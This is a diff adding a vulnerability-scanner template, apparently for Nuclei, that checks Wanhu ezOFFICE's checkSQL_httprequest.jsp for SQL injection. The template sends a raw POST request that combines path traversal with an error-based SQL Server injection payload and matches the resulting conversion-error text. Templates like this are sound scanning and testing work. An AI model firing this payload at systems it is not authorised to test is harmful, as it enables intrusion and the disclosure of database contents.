@@ -1,0 +1,28 @@
+id: wanhu-ezOFFICE-checkSQL_httprequest_jsp-sql
+
+info:
+  name: 万户 ezOFFICE checkSQL_httprequest.jsp SQL注入漏洞
+  author: wanhu
+  severity: high
+  tags: sql injection
+
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../modules/hrm/report/customize/checkSQL_httprequest.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        selectSQL=select distinct convert(int,@@VERSION)&dbType=sqlserver&fromSQL=--from+sysobjects+&whereSQL=--
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '将 nvarchar 值'
+          - '转换成数据类型 int 时失败'
+        condition: and
+      - type: status
+        status: 
+          - 200
